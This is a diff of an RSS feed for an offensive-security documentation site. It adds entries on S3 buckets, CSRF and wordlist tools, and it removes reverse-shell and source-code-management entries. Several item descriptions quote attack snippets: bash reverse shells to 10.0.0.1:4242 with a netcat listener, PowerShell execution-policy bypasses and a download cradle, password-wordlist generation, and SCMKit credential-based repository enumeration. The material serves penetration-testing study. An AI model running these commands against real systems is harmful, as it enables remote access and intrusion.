@@ -6,7 +6,26 @@
     <description>Recent content in Docs on Gray Hat Freelancing</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2023</copyright>
-    <lastBuildDate>Mon, 20 Feb 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 02 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Amazon AWS S3 Buckets</title>
+      <link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link>
+      <pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid>
+      <description>Amazon Bucket S3 AWS # Amazon S3 (Simple Storage Service) Buckets are data object storage buckets hosted on Amazon&amp;rsquo;s cloud service. Being in the cloud it&amp;rsquo;s a highly scalable data storge service and it allows you to set all sorts of permissions and other controls around your data. That said, there&amp;rsquo;s often plenty of juicy information in Amazon S3 buckets.. there&amp;rsquo;s also often nothing more than just images and such.</description>
+    </item>
+    
+    <item>
+      <title>CSRF Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link>
+      <pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid>
+      <description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
+Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description>
+    </item>
+    
     <item>
       <title>Cobalt Strike</title>
       <link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link>
@@ -34,6 +53,7 @@ Python # armstrong numbers # import math def is_armstrong_number(number): &amp;#
       
       <guid>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</guid>
       <description>Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
+WikiRaider # Generate wordlists fit for your &amp;ldquo;target audience&amp;rdquo;. https://github.com/NorthwaveSecurity/wikiraider
 Crunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.</description>
     </item>
     
@@ -288,25 +308,6 @@ Get-SQLDatabase -Username sa -Password Password1234 -Instance &amp;#34;&amp;lt;D
       
       <guid>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</guid>
       <description>Powershell # Summary # Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy # powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands # Windows $command = &amp;#39;IEX (New-Object Net.</description>
-    </item>
-    
-    <item>
-      <title>Reverse Shell Cheatsheet</title>
-      <link>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</guid>
-      <description>Reverse Shell Cheat Sheet # Tools # reverse-shell-generator - Hosted Reverse Shell generator (source) revshellgen - CLI Reverse Shell generator Reverse Shell # Bash TCP # bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/4242; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 /bin/bash -l &amp;gt; /dev/tcp/10.0.0.1/4242 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1 Bash UDP # Victim: sh -i &amp;gt;&amp;amp; /dev/udp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 Listener: nc -u -lvp 4242 Don&amp;rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</description>
-    </item>
-    
-    <item>
-      <title>Source Code Management</title>
-      <link>https://www.grayhatfreelancing.com/docs/source_code_management/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/source_code_management/</guid>
-      <description>Source Code Management # Enumeration # Using SCMKit - Source Code Management Attack Toolkit
-Discover repositories being used in a particular SCM system SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local Search for repositories by repository name in a particular SCM system SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o &amp;#34;some search term&amp;#34; SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.</description>
     </item>
     
   </channel>
